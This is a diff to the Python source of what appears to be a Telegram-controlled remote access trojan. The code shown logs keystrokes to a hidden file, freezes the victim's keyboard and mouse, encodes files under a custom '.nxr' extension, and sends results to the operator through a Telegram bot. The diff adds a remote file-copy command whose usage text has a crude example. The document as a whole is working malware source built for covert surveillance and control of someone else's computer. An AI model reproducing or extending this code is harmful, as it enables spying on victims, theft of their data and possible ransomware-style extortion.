@@ -50,7 +50,6 @@ mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 schedule = {}
 log_file = hide_folder + '\\.user'
-
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
@@ -106,7 +105,6 @@ def pressed_chars(event):
 		f.write(tofile)
 		f.close()
 	return not keyboardFrozen
-
 def split_string(n, st):
 	lst = ['']
 	for i in str(st):
@@ -116,7 +114,6 @@ def split_string(n, st):
 		else:
 			lst += [i]
 	return lst
-
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
@@ -128,10 +125,10 @@ def send_safe_message(bot, chat_id, message):
 def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
+		response = ''
 		if 'text' in msg:
 			print '\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n'
 			command = msg['text']
-			response = ''
 			if command == '/arp':
 				response = ''
 				bot.sendChatAction(chat_id, 'typing')
@@ -195,6 +192,20 @@ def handle(msg):
 						elif command.startswith('/de') and full_path.endswith('.nxr'):#our extension (been encoded)
 							decode(full_path)
 				response = 'Files ' + command[1:3] + 'coded succesfully.'
+			elif command.startswith('/cp'):
+				command = command.replace('/cp', '')
+				command = command.strip()
+				if len(command) > 0:
+					try:
+						file1 = command.split('"')[1];
+						file2 = command.split('"')[3];
+						copyfile(file1, file2)
+						response = 'Files copied succesfully.'
+					except Exception as e:
+						response = 'Error: \n' + str(e)
+				else:
+					response = 'Usage: \n/cp "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
+					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
 			elif command.endswith('freeze_keyboard'):
 				global keyboardFrozen
 				keyboardFrozen = not command.startswith('/un')
@@ -375,6 +386,8 @@ def handle(msg):
 				response += '\n' + response2
 			elif command.startswith('/to'):
 				command = command.replace('/to','')
+				import winsound
+				winsound.Beep(440, 300)
 				if command == '':
 					response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
 				else:
@@ -407,7 +420,6 @@ def handle(msg):
 		if response != '':
 			responses = split_string(4096, response)
 			for resp in responses:
-				#bot.sendMessage(chat_id, resp)
 				send_safe_message(bot, chat_id, resp)#
 			
 bot = telepot.Bot(token)
